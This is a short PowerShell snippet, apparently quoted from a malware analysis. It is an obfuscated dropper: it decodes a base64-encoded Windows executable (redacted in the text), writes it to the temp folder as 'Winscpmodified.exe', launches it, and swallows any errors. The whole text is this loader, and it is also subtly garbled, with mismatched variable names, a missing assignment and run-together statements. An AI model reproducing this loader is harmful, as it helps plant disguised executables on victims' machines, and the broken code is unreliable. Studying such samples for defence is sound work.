
function A1B2C {
param (
[Parameter (Mandatory = $true)] [string] $D3E4F,
[Parameter (Mandatory = $true)]
[string] $G5H6I
)
$J7K8L = [System.IO.Path]::GetTempPath()
$M9N00 = Join-Path -Path $J7K8L -ChildPath $G5H6I
try {
$P1Q2R = [System.Convert]:: FromBase64String($D3E4F) [System.IO.File]::WriteAllBytes($M9N00, $P1Q2R) Start-Process -FilePath $M9N0O
} catch {
}
}
$S3T4U
"TVqQA << REDUCTED>> AAAAAAAA"
$V5W6X = "Winscpmodified.exe"
A1B2C -D3E4F $S3T4U -G5H61 $V5W6X
